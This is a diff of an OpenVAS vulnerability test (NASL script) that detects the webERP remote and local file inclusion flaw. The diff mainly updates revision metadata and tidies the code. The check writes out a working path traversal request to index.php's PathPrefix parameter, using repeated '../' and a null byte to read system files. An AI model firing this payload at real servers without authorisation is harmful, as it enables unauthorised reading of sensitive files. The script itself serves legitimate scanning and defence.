@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_weberp_54236.nasl 5640 2017-03-21 08:12:48Z cfi $
+# $Id: gb_weberp_54236.nasl 5715 2017-03-24 11:34:41Z cfi $
 #
 # webERP Multiple Remote and Local File Include Vulnerabilities
 #
@@ -36,23 +36,18 @@ facilitate unauthorized access.
 
 webERP 4.08.1 and prior are vulnerable.";
 
-
 if (description)
 {
  script_id(103505);
  script_bugtraq_id(54236);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
- script_version ("$Revision: 5640 $");
-
+ script_version ("$Revision: 5715 $");
  script_name("webERP Multiple Remote and Local File Include Vulnerabilities");
-
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/54236");
  script_xref(name : "URL" , value : "http://www.weberp.org/HomePage");
-
- script_tag(name:"last_modification", value:"$Date: 2017-03-21 09:12:48 +0100 (Tue, 21 Mar 2017) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-24 12:34:41 +0100 (Fri, 24 Mar 2017) $");
  script_tag(name:"creation_date", value:"2012-07-02 11:58:46 +0200 (Mon, 02 Jul 2012)");
- script_summary("Determine if it is possible to read a local file");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
@@ -65,30 +60,28 @@ if (description)
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
+include("host_details.inc");
    
-port = get_http_port(default:80);
+port = get_http_port( default:80 );
+if( ! can_host_php( port:port ) ) exit( 0 );
 
-if(!get_port_state(port))exit(0);
-if(!can_host_php(port:port))exit(0);
-
-dirs = make_list("/webERP","/weberp","/erp",cgi_dirs());
 files = traversal_files();
 
-foreach dir (dirs) {
-  foreach file (keys(files)) {
-   
-    url = string(dir, "/index.php?PathPrefix=",crap(data:"../",length:9*6),files[file],"%00"); 
+foreach dir( make_list_unique( "/webERP", "/weberp", "/erp", cgi_dirs( port:port ) ) ) {
 
-    if(http_vuln_check(port:port, url:url,pattern:file)) {
-     
-      security_message(port:port);
-      exit(0);
+  if( dir == "/" ) dir = "";
 
+  foreach file( keys( files ) ) {
+
+    url = dir + "/index.php?PathPrefix=" + crap( data:"../", length:9 * 6 ) + files[file] + "%00";
+
+    if( http_vuln_check( port:port, url:url, pattern:file ) ) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
     }
-  }  
+  }
 }
 
-exit(0);
+exit( 99 );
